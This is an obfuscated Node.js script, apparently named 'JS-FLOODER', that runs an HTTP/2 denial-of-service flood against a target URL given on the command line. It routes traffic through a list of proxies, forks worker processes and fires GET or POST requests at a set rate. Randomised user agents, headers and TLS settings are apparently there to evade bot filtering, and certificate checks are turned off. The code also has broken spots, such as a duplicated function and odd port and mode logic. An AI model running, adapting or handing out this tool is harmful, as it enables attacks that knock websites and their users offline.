const url = require("url"),
  fs = require("fs"),
  http2 = require("http2"),
  http = require("http"),
  tls = require("tls"),
  cluster = require("cluster"),
  crypto = require("crypto"),
  os = require("os"),
  v8 = require("v8"),
  errorHandler = _0x5d4047 => {};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
try {} catch (_0x32f66a) {
  console.log("\x1B[36mInstalling\x1B[37m the requirements");
  execSync("npm install colors");
  console.log("Done.");
  process.exit();
}
cplist = ["TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384"];
controle_header = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "TimeoutError", "JSONError", "URLError", "InvalidURL", "ProxyError"];
ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO", "EAI_AGAIN", "EHOSTDOWN", "ENETRESET", "ENETUNREACH", "ENONET", "ENOTCONN", "ENOTFOUND", "EAI_NODATA", "EAI_NONAME", "EADDRNOTAVAIL", "EAFNOSUPPORT", "EALREADY", "EBADF", "ECONNABORTED", "EDESTADDRREQ", "EDQUOT", "EFAULT", "EHOSTUNREACH", "EIDRM", "EILSEQ", "EINPROGRESS", "EINTR", "EINVAL", "EIO", "EISCONN", "EMFILE", "EMLINK", "EMSGSIZE", "ENAMETOOLONG", "ENETDOWN", "ENOBUFS", "ENODEV", "ENOENT", "ENOMEM", "ENOPROTOOPT", "ENOSPC", "ENOSYS", "ENOTDIR", "ENOTEMPTY", "ENOTSOCK", "EOPNOTSUPP", "EPERM", "EPIPE", "EPROTONOSUPPORT", "ERANGE", "EROFS", "ESHUTDOWN", "ESPIPE", "ESRCH", "ETIME", "ETXTBSY", "EXDEV", "UNKNOWN", "DEPTH_ZERO_SELF_SIGNED_CERT", "UNABLE_TO_VERIFY_LEAF_SIGNATURE", "CERT_HAS_EXPIRED", "CERT_NOT_YET_VALID"];
process.on("uncaughtException", function (_0x7fc8a7) {
  if (_0x7fc8a7.code && ignoreCodes.includes(_0x7fc8a7.code) || _0x7fc8a7.name && ignoreNames.includes(_0x7fc8a7.name)) return !1;
}).on("unhandledRejection", function (_0xa961cd) {
  if (_0xa961cd.code && ignoreCodes.includes(_0xa961cd.code) || _0xa961cd.name && ignoreNames.includes(_0xa961cd.name)) return !1;
}).on("warning", _0x51786b => {
  if (_0x51786b.code && ignoreCodes.includes(_0x51786b.code) || _0x51786b.name && ignoreNames.includes(_0x51786b.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2],
  time = process.argv[3],
  thread = process.argv[4],
  proxyFile = process.argv[5],
  rps = process.argv[6];
let input = "bypass";
(!target || !time || !thread || !proxyFile || !rps || !input) && (console.log("JS-FLOODER".bgRed), console.error(("Example: node " + process.argv[1] + " url time thread proxy.txt rate query(true/false)").rainbow), console.log("default : query : true".red), process.exit(1));
!/^https?:\/\//i.test(target) && (console.error("sent with http:// or https://"), process.exit(1));
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, "utf-8");
  proxys = proxyData.match(/\S+/g);
} catch (_0xf2d6a0) {
  console.error("Error proxy file:", _0xf2d6a0.message);
  process.exit(1);
}
(isNaN(rps) || rps <= 0) && (console.error("number rps"), process.exit(1));
const proxyr = () => {
  return proxys[Math.floor(Math.random() * proxys.length)];
};
function randx(_0x5e80f2) {
  const _0x1a5cf9 = ":-(";
  let _0x3b024c = "";
  const _0xb5f361 = _0x1a5cf9.length;
  for (let _0x476a89 = 0; _0x476a89 < _0x5e80f2; _0x476a89++) {
    _0x3b024c += _0x1a5cf9.charAt(Math.floor(Math.random() * _0xb5f361));
  }
  return _0x3b024c;
}
function shuffleObject(_0x1956ef) {
  const _0x4c0e90 = Object.keys(_0x1956ef),
    _0x1c0984 = _0x4c0e90.reduce((_0x2cc2e6, _0x48b528, _0x193e72, _0x54f266) => {
      const _0x1caf94 = Math.floor(Math.random() * (_0x193e72 + 1));
      return _0x2cc2e6[_0x193e72] = _0x2cc2e6[_0x1caf94], _0x2cc2e6[_0x1caf94] = _0x4c0e90[_0x193e72], _0x2cc2e6;
    }, []),
    _0x4a2972 = Object.fromEntries(_0x1c0984.map(_0x4cf39f => [_0x4cf39f, _0x1956ef[_0x4cf39f]]));
  return _0x4a2972;
}
function generateRandomString(_0x284867, _0x2119b8) {
  const _0x2c9ee9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    _0x54fe62 = Math.floor(Math.random() * (_0x2119b8 - _0x284867 + 1)) + _0x284867,
    _0x1bd733 = Array.from({
      "length": _0x54fe62
    }, () => {
      const _0x18aaeb = Math.floor(Math.random() * _0x2c9ee9.length);
      return _0x2c9ee9[_0x18aaeb];
    });
  return _0x1bd733.join("");
}
function eko(_0x53bb99, _0x497898) {
  const _0x3051df = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    _0x369764 = Math.floor(Math.random() * (_0x497898 - _0x53bb99 + 1)) + _0x53bb99,
    _0x4d50e8 = Array.from({
      "length": _0x369764
    }, () => {
      const _0x337d21 = Math.floor(Math.random() * _0x3051df.length);
      return _0x3051df[_0x337d21];
    });
  return _0x4d50e8.join("");
}
function eko(_0x386b59, _0x1cc8e4) {
  const _0x2b44d8 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    _0x3c9cf3 = Math.floor(Math.random() * (_0x1cc8e4 - _0x386b59 + 1)) + _0x386b59,
    _0x4f7232 = Array.from({
      "length": _0x3c9cf3
    }, () => {
      const _0x2aa914 = Math.floor(Math.random() * _0x2b44d8.length);
      return _0x2b44d8[_0x2aa914];
    });
  return _0x4f7232.join("");
}
function randnum(_0x4c5a9b, _0x3439ec) {
  const _0x569ffc = "0123456789",
    _0x4eb85b = Math.floor(Math.random() * (_0x3439ec - _0x4c5a9b + 1)) + _0x4c5a9b,
    _0x1441ff = Array.from({
      "length": _0x4eb85b
    }, () => {
      const _0x5c8b5e = Math.floor(Math.random() * _0x569ffc.length);
      return _0x569ffc[_0x5c8b5e];
    });
  return _0x1441ff.join("");
}
function getRandomInt(_0x52eadf, _0x21c1f8) {
  return Math.floor(Math.random() * (_0x21c1f8 - _0x52eadf + 1)) + _0x52eadf;
}
function addRandomValuesToObject(_0x27ecf9) {
  const _0x21851c = {};
  return Object.keys(_0x27ecf9).forEach(_0x45ed3c => {
    const _0x599241 = eko(1, 2),
      _0x54e5b1 = eko(1, 2),
      _0x136409 = _0x45ed3c + _0x599241,
      _0x8603c9 = _0x27ecf9[_0x45ed3c] + _0x54e5b1;
    _0x21851c[_0x136409] = _0x8603c9;
  }), _0x21851c;
}
const MAX_RAM_PERCENTAGE = 40,
  RESTART_DELAY = 100;
let postData, post;
if (cluster.isMaster) {
  console.clear();
  console.log("HEAP SIZE:", v8.getHeapStatistics().heap_size_limit / (1024 * 1024));
  console.log("@STRSTRING".bgRed);
  console.log("[!] SARTA STORM");
  process.stdout.write("Loading: 10%\n");
  setTimeout(() => {
    process.stdout.write("\rLoading: 50%\n");
  }, 500 * time);
  setTimeout(() => {
    process.stdout.write("\rLoading: 100%\n");
  }, time * 1000);
  const restartScript = () => {
      for (const _0xc8925a in cluster.workers) {
        cluster.workers[_0xc8925a].kill();
      }
      console.log("[>] Restarting ", RESTART_DELAY, "ms...");
      setTimeout(() => {
        for (let _0x22287a = 1; _0x22287a <= thread; _0x22287a++) {
          cluster.fork();
        }
      }, RESTART_DELAY);
    },
    handleRAMUsage = () => {
      const _0x47df59 = os.totalmem(),
        _0x1edca1 = _0x47df59 - os.freemem(),
        _0x36b2ea = _0x1edca1 / _0x47df59 * 100;
      if (_0x36b2ea >= MAX_RAM_PERCENTAGE) {
        console.log("[!] Maximum RAM ", _0x36b2ea.toFixed(2), "%");
        restartScript();
      }
    },
    argsa = process.argv.slice(7),
    queryIndexa = argsa.indexOf("--post");
  post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
  if (post === "true") {
    argsq = process.argv.slice(7);
    const dataIndex = argsq.indexOf("--data");
    postData = dataIndex !== -1 ? argsq[dataIndex + 1] : null;
    if (postData === null || postData.trim() === "") console.log("Require post data"), process.exit();else {}
  } else console.log("GET MODE");
  setInterval(handleRAMUsage, 1000);
  for (let i = 0; i < thread; i++) {
    cluster.fork();
  }
  setTimeout(() => process.exit(-1), time * 1000);
} else {
  if (input === "bypass") {} else setInterval(flood);
}
async function flood() {
  var _0x501cec = url.parse(target),
    _0x435758 = proxyr().split(":");
  let _0x49263f;
  if (input === "flood") _0x49263f = 1000;else {
    if (input === "bypass") {
      function _0x25c521(_0x59f418, _0x1afc61) {
        return Math.floor(Math.random() * (_0x1afc61 - _0x59f418 + 1)) + _0x59f418;
      }
      _0x49263f = _0x25c521(500, 1000);
    } else _0x49263f = 1000;
  }
  nodeii = getRandomInt(109, 124);
  pervalue = ["\\\"Brave\\\";v=\\\"" + nodeii + "\\\", \\\"Not" + (Math.random() < 0.5 ? randx(1) : " ") + "A" + (Math.random() < 0.5 ? randx(1) : " ") + ("Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"" + nodeii + "\\"), "\\\"Not" + (Math.random() < 0.5 ? randx(1) : " ") + "A" + (Math.random() < 0.5 ? randx(1) : " ") + ("Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"" + nodeii + "\\\", \\\"Google Chrome\\\";v=\\\"" + nodeii + "\\"), "\\\"Not" + (Math.random() < 0.5 ? randx(1) : " ") + "A" + (Math.random() < 0.5 ? randx(1) : " ") + ("Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"" + nodeii + "\\\", \\\"Brave\\\";v=\\\"" + nodeii + "\\"), "\\\"Not" + (Math.random() < 0.5 ? randx(1) : " ") + "A" + (Math.random() < 0.5 ? randx(1) : " ") + ("Brand\\\";v=\\\"99\\\", \\\"Brave\\\";v=\\\"" + nodeii + "\\\", \\\"Chromium\\\";v=\\\"" + nodeii + "\\"), "\\\"Google Chrome\\\";v=\\\"" + nodeii + "\\\", \\\"Not" + (Math.random() < 0.5 ? randx(1) : " ") + "A" + (Math.random() < 0.5 ? randx(1) : " ") + ("Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"" + nodeii + "\\"), "\\\"Chromium\\\";v=\\\"" + nodeii + "\\\", \\\"Not" + (Math.random() < 0.5 ? randx(1) : " ") + "A" + (Math.random() < 0.5 ? randx(1) : " ") + ("Brand\\\";v=\\\"24\\\", \\\"Brave\\\";v=\\\"" + nodeii + "\\"), "\\\"Chromium\\\";v=\\\"" + nodeii + "\\\", \\\"Not" + (Math.random() < 0.5 ? randx(1) : " ") + "A" + (Math.random() < 0.5 ? randx(1) : " ") + ("Brand\\\";v=\\\"24\\\", \\\"Google Chrome\\\";v=\\\"" + nodeii + "\\")];
  var _0x1d476c = ["Chrome/122.0.0.0 Safari/537.36", "Chrome/121.0.0.0 Safari/537.36", "Chrome/120.0.0.0 Safari/537.36", "Chrome/119.0.0.0 Safari/537.36"];
  function _0x27f4a9(_0x3bfda7) {
    const _0x5df1ea = Math.floor(Math.random() * _0x3bfda7.length);
    return _0x3bfda7[_0x5df1ea];
  }
  const _0x41b071 = await new http.Agent({
      "host": _0x435758[0],
      "port": _0x435758[1],
      "keepAlive": false,
      "keepAliveMsecs": 500000000,
      "maxSockets": 50000,
      "maxTotalSockets": 100000
    }),
    _0x27eea6 = {
      "agent": _0x41b071,
      "method": "CONNECT",
      "path": _0x501cec.host + ":443",
      "timeout": 5000,
      "headers": {
        "Host": _0x501cec.host,
        "Proxy-Connection": "Keep-Alive",
        "Connection": "close",
        "Proxy-Authorization": "Basic " + Buffer.from(_0x435758[2] + ":" + _0x435758[3]).toString("base64")
      }
    };
  connection = await http.request(_0x27eea6, _0x2de6d4 => {});
  connection.on("error", _0x11bf67 => {
    if (_0x11bf67) return;
  });
  connection.on("timeout", async () => {
    return;
  });
  const _0x129766 = process.argv.slice(7),
    _0x331540 = _0x129766.indexOf("--query"),
    _0x1bebfd = _0x331540 !== -1 ? _0x129766[_0x331540 + 1] : null,
    _0x22e346 = process.argv.slice(7),
    _0x57e99b = _0x22e346.indexOf("--post");
  post = _0x57e99b !== -1 ? _0x22e346[_0x57e99b + 1] : null;
  const _0x4b5f04 = process.argv.slice(2),
    _0x14c187 = _0x4b5f04.indexOf("--randuser"),
    _0x22f48b = _0x14c187 !== -1 ? _0x4b5f04[_0x14c187 + 1] : null,
    _0x1ecb7e = _0x22f48b || "false";
  let _0x37329b;
  _0x1ecb7e !== "true" ? _0x37329b = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/" + nodeii + ".0.0.0 Safari/537.36" : _0x37329b = generateRandomString(5, 7) + ("Mozilla/5.0 (Windows NT " + randnum(0, 10) + ".0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/" + nodeii + ".0.0.0 Safari/537.36") + getRandomInt(100, 99999) + "." + getRandomInt(100, 99999);
  const _0x1ee5e0 = [{
      [eko(1, 2) + "sec-fetch-site-" + eko(1, 2) + "--" + eko(2, 4)]: "-none-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "sec-fetch-mode-" + eko(1, 2) + "--" + eko(2, 4)]: "-navigate-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "sec-fetch-user-" + eko(1, 2) + "--" + eko(2, 4)]: "-?0-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "sec-fetch-dest-" + eko(1, 2) + "--" + eko(2, 4)]: "-dynamic-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "accept-encoding-" + eko(1, 2) + "--" + eko(2, 4)]: "-=noi=ne-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "accept-language-" + eko(1, 2) + "--" + eko(2, 4)]: "-=none-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "x-botnet-close-" + eko(1, 2) + "--" + eko(2, 4)]: "-undefined-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "x-session-floor-" + eko(1, 2) + "--" + eko(2, 4)]: "=css-null-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "x-forwarded-for-" + eko(1, 2) + "--" + eko(2, 4)]: "=null-" + eko(1, 2) + "-" + eko(1, 2)
    }, {
      [eko(1, 2) + "x-emty-log-" + eko(1, 2) + "--" + eko(2, 4)]: "=dynamic-" + eko(1, 2) + "-" + eko(1, 2)
    }],
    _0x1d1f30 = {
      ...(Math.random() < 0.4 ? {
        "cache-control": "no-cache"
      } : {}),
      ...(Math.random() < 0.8 ? {
        "sec-ch-ua-mobile": "?0"
      } : {}),
      "sec-ch-ua-platform": "\\Windows\"\\",
      "upgrade-insecure-requests": "1",
      "Sec-Ch-Ua-Platform": "\\UnKnown\"\\",
      "upgrade-insecure-requests": "1",
      "user-agent": _0x37329b,
      ...(Math.random() < 0.5 ? {
        "sarta-purpose": "prefetch"
      } : {}),
      ...(Math.random() < 0.5 ? {
        "upgrade-insecure-requests": "1"
      } : {}),
      ...(Math.random() < 0.2 ? {
        "sec-fetch-site": Math.random() < 0.2 ? "none;none" : "none",
        "sec-fetch-mode": Math.random() < 0.2 ? "navigate;navigation" : "navigate",
        "sec-fetch-user": Math.random() < 0.2 ? "?1;?1" : "?1"
      } : {}),
      "x-forwarded-proto": "https",
      "accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
      "sec-fetch-dest": "document",
      "accept-encoding": "gzip, deflate, br",
      ...(Math.random() < 0.3 ? _0x1ee5e0[Math.floor(Math.random() * _0x1ee5e0.length)] : {}),
      ...(Math.random() < 0.3 ? _0x1ee5e0[Math.floor(Math.random() * _0x1ee5e0.length)] : {}),
      ...(Math.random() < 0.3 ? _0x1ee5e0[Math.floor(Math.random() * _0x1ee5e0.length)] : {}),
      ...(Math.random() < 0.5 ? {
        ["rada-sys-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + "-" + generateRandomString(1, 12) + "=" + generateRandomString(1, 12)
      } : {}),
      ...(Math.random() < 0.5 ? {
        ["fm-lmao-oo-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + "-" + generateRandomString(1, 12) + "=" + generateRandomString(1, 12)
      } : {}),
      ["cancel-null-" + generateRandomString(1, 9)]: generateRandomString(1, 10) + "-" + generateRandomString(1, 12) + "=" + generateRandomString(1, 12)
    };
  cipor = cplist.join(":");
  const _0x503245 = {
    "cipher": cipor,
    "secureProtocol": ["TLSv1.3_method", "TLSv1.2_method"],
    ...(Math.random() < 0.5 ? {
      "echdCurve": "X25519"
    } : {
      "echdCurve": "secp256r1:X25519;"
    }),
    "sigalgs": "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
    "secure": true,
    "rejectUnauthorized": false,
    "ALPNProtocols": ["h2", "http1/1"],
    "secureOptions": crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
  };
  async function _0x463cf4(_0x2b8515, _0x15f9aa) {
    const _0x589216 = await tls.connect({
      ..._0x503245,
      "host": _0x2b8515.host,
      "port": 22,
      "servername": _0x2b8515.host,
      "socket": _0x15f9aa
    });
    return _0x589216;
  }
  connection.on("connect", async function (_0x18d483, _0x34addc) {
    const _0x151446 = await _0x463cf4(_0x501cec, _0x34addc);
    clasq = Math.random() < 0.5 ? 12517377 + 65535 : 15663105 + 65535;
    const _0x209ba7 = await http2.connect(_0x501cec.href, {
      ...shuffleObject({
        "createConnection": () => _0x151446,
        "unknownProtocolTimeout": 100,
        "maxReservedRemoteStreams": 100,
        "maxSessionMemory": 100,
        "settings": {
          "headerTableSize": 262144,
          "enablePush": false,
          ...(Math.random() < 0.5 ? {
            "maxConcurrentStreams": 100
          } : {}),
          "initialWindowSize": Math.random() < 0.5 ? 6291456 : 33554432,
          ...(Math.random() < 0.5 ? {
            "maxFrameSize": 15000
          } : {}),
          "maxHeaderListSize": 65536
        }
      })
    }, _0xa0dd8e => {
      _0xa0dd8e.setLocalWindowSize(clasq);
    });
    _0x209ba7.on("connect", async () => {
      setInterval(async () => {
        for (let _0x34747e = 0; _0x34747e < rps; _0x34747e++) {
          author = {
            ...(post === "true" ? {
              ":method": "POST"
            } : {
              ":method": "GET"
            }),
            ...(post === "true" ? {
              "content-length": "0"
            } : {}),
            ":authority": _0x501cec.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ...(_0x1bebfd === "true" ? {
              ":path": _0x501cec.path + "data" + generateRandomString(0, 10) + "=" + generateRandomString(10, 20) + Math.random() < 1 / 100000 ? _0x501cec.path + "?search=" + generateRandomString(2, 3) : _0x501cec.path + "?search==#" + generateRandomString(2, 3)
            } : {
              ":path": Math.random() < 1 / 100000 ? _0x501cec.path + "?search=" + generateRandomString(2, 3) + "&&lr" + generateRandomString(2, 3) : _0x501cec.path + "?search=null#" + generateRandomString(2, 3) + "&lr=" + generateRandomString(2, 3)
            }),
            "cookie": "wp-" + generateRandomString(0, 10) + "=" + generateRandomString(0, 10)
          };
          head = _0x1d1f30;
          const _0x5e62a8 = await _0x209ba7.request({
            ...author,
            ...head
          }, {
            "exclusive": true,
            "weight": 256,
            "waitForTrailers": true,
            "endStream": true
          });
          _0x5e62a8.end();
        }
      }, _0x49263f);
    });
    _0x209ba7.on("close", () => {
      return _0x209ba7.destroy(), _0x151446.destroy(), _0x34addc.destroy(), flood();
    });
    _0x209ba7.on("error", async _0x5a17f3 => {
      if (_0x5a17f3) {
        return await _0x209ba7.destroy(), await _0x151446.destroy(), await _0x34addc.destroy(), flood();
      }
    });
  });
  connection.end();
}